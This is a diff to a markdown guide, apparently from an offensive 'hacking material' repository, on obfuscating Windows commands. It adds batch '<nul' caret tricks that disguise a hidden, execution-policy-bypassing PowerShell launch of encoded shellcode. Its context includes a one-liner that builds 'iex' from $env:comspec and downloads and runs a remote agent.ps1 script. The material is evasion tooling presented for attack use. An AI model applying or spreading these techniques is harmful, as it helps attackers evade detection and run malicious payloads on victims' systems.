@@ -97,6 +97,19 @@ https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/p
 
 ---
 
+      Using a batch redirection caret (<nul) to 'escape' tokens.
+      'If you place a token at the caret the token is removed'.
+
+**example:** `cmd.exe <nul /c start <nul calc` == `cmd.exe /c start calc`
+![batch obfuscation](http://i.cubeupload.com/cu5bpj.jpg)
+
+- String command to obfuscate<br />
+`cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`
+
+- Using batch **redirection (<nul)** special character to obfuscate sourcecode.
+`cmd.exe /c <nul powershell.exe <nul -nop -wind hidden -Exec Bypass -noni -enc $shellcode`
+
+---
 
 <br /><br /><br />
 
@@ -172,7 +185,7 @@ The above string can be obfuscated using **powershell special characters:** **`*
 ---
 
 - Using **$env:comspec** (windows environment variable) and **-Join ''** to pull out the 4º,15º and 25º characters
-from $env:comspec variable and use the **-Join ''** operator to take the arraw and convert it to a string.
+from $env:comspec variable and use the **-Join ''** operator to take the array and convert it to a string.
 
       $env:comspec[4,15,25]-Join '' (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')
 
